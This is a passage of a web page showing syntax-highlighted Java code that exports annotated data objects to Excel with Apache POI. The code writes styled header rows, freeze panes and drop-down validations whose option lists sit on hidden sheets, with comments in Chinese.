punctuation">(</span>CollectionUtils<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dataList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                Row row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> type <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String dateFormat <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    Object value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Cell cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> Date<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            dateFormat <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            String formatValue <span class="token operator">=</span> DateUtil<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Date<span class="token punctuation">)</span> value<span class="token punctuation">,</span> dateFormat<span class="token punctuation">)</span><span class="token punctuation">;</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>formatValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//冻结窗格</span>        wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createFreezePane</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//添加下拉选择框</span>        <span class="token keyword">int</span> sheetNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Integer columnIndex <span class="token operator">:</span> singleComboBoxMap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//定义当前sheet的名称和序号,默认第一个sheet为正文,那么从第二个开始</span>            <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> singleComboBoxMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"hideSigleComboBox_"</span> <span class="token operator">+</span> sheetNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> columnIndex<span class="token punctuation">,</span> columnIndex<span class="token punctuation">,</span> sheetNum<span class="token punctuation">)</span><span class="token punctuation">;</span>            sheetNum<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>wb<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 通用导出excel(.xlsx后缀)     *     * @param response     * @param dataList       数据列表     * @param cls            数据所属对象class     * @param firstSheetName 表格名称     * @param &lt;T>     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">writePlotExcelMax</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>T<span class="token operator">></span> dataList<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> cls<span class="token punctuation">,</span> String firstSheetName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Field<span class="token operator">></span> fieldList <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span>Comparator<span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        col <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> col<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        XSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        XSSFSheet sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//使用Map存放哪个字段对应的列数 需要有单选下拉框</span>        Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> singleComboBoxMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">{</span>            Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            row<span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//写入头部</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fieldList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Field field <span class="token operator">=</span> fieldList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String columnName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                String<span class="token punctuation">[</span><span class="token punctuation">]</span> singleComboBox <span class="token operator">=</span> null<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    columnName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    singleComboBox <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">singleComboBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>singleComboBox<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        singleComboBoxMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> singleComboBox<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                XSSFCellStyle cellStyle <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>SKY_BLUE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//垂直剧中</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//水平居左</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//下边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右边框</span>                XSSFFont font <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//fieldList.forEach(field -> {</span>            <span class="token comment" spellcheck="true">//});</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtils<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dataList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                Row row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> type <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String dateFormat <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    Object value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Cell cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> Date<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            dateFormat <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            String formatValue <span class="token operator">=</span> DateUtil<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Date<span class="token punctuation">)</span> value<span class="token punctuation">,</span> dateFormat<span class="token punctuation">)</span><span class="token punctuation">;</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>formatValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//冻结窗格</span>        sheet<span class="token punctuation">.</span><span class="token function">createFreezePane</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//添加下拉选择框</span>        <span class="token keyword">int</span> sheetNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Integer columnIndex <span class="token operator">:</span> singleComboBoxMap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//定义当前sheet的名称和序号,默认第一个sheet为正文,那么从第二个开始</span>            <span class="token function">setXSSFValidation</span><span class="token punctuation">(</span>sheet<span class="token punctuation">,</span> singleComboBoxMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"hideSigleComboBox_"</span> <span class="token operator">+</span> sheetNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> columnIndex<span class="token punctuation">,</span> columnIndex<span class="token punctuation">,</span> sheetNum<span class="token punctuation">)</span><span class="token punctuation">;</span>            sheetNum<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>wb<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置某些列的值只能输入预制的数据,显示下拉框     *     * @param sheet           XSSFSheet sheetlist = wb.createSheet("XXXX");工作表对象     * @param textlist        下拉框内容     * @param hiddenSheetName 下拉框内容所在隐藏sheet名称     * @param firstRow        添加下拉框对应开始行     * @param endRow          添加下拉框对应结束行     * @param firstCol        添加下拉框对应开始列     * @param endCol          添加下拉框对应结束列     * @param sheetNum        sheet所在位置(从0开始算)     * @return     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setXSSFValidation</span><span class="token punctuation">(</span>XSSFSheet sheet<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> textlist<span class="token punctuation">,</span> String hiddenSheetName<span class="token punctuation">,</span>                                          <span class="token keyword">int</span> firstRow<span class="token punctuation">,</span> <span class="token keyword">int</span> endRow<span class="token punctuation">,</span> <span class="token keyword">int</span> firstCol<span class="token punctuation">,</span> <span class="token keyword">int</span> endCol<span class="token punctuation">,</span> <span class="token keyword">int</span> sheetNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//这里将下拉框进行拆分存储在每一个单元格  并进行隐藏  防止下拉框数据过多存储在一个单元格的字符数大于255而报错</span>        XSSFWorkbook workbook <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">getWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        XSSFSheet hidden <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>hiddenSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        XSSFCell cell <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">=</span> textlist<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String name <span class="token operator">=</span> textlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            XSSFRow roww <span class="token operator">=</span> hidden<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            cell <span class="token operator">=</span> roww<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        XSSFName namedCell <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        namedCell<span class="token punctuation">.</span><span class="token function">setNameName</span><span class="token punctuation">(</span>hiddenSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        namedCell<span class="token punctuation">.</span><span class="token function">setRefersToFormula</span><span class="token punctuation">(</span>hiddenSheetName <span class="token operator">+</span> <span class="token string">"!$A$1:$A$"</span> <span class="token operator">+</span> textlist<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将第sheetNum个sheet页设置为隐藏</span>        workbook<span class="token punctuation">.</span><span class="token function">setSheetHidden</span><span class="token punctuation">(</span>sheetNum<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将名称为hiddenSheetName的数据进行加载</span>        XSSFDataValidationHelper dvHelper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFDataValidationHelper</span><span class="token punctuation">(</span>sheet<span class="token punctuation">)</span><span class="token punctuation">;</span>        XSSFDataValidationConstraint constraint <span class="token operator">=</span> <span class="token punctuation">(</span>XSSFDataValidationConstraint<span class="token punctuation">)</span> dvHelper<span class="token punctuation">.</span><span class="token function">createFormulaListConstraint</span><span class="token punctuation">(</span>hiddenSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置数据有效性加载在哪个单元格上,四个参数分别是：起始行、终止行、起始列、终止列</span>        CellRangeAddressList regions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CellRangeAddressList</span><span class="token punctuation">(</span>firstRow<span class="token punctuation">,</span> endRow<span class="token punctuation">,</span> firstCol<span class="token punctuation">,</span> endCol<span class="token punctuation">)</span><span class="token punctuation">;</span>        XSSFDataValidation validation <span class="token operator">=</span> <span class="token punctuation">(</span>XSSFDataValidation<span class="token punctuation">)</span> dvHelper<span class="token punctuation">.</span><span class="token function">createValidation</span><span class="token punctuation">(</span>constraint<span class="token punctuation">,</span> regions<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">addValidationData</span><span class="token punctuation">(</span>validation<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 通用导出excel(多个sheet)     *     * @param response     * @param dataListList 数据列表     * @param cls          数据所属对象class     * @param sheetName    表格名称     * @param &lt;T>     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">writePlotExcelMore</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>T<span class="token operator">>></span> dataListList<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> cls<span class="token punctuation">,</span> String sheetName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Field<span class="token operator">></span> fieldList <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span 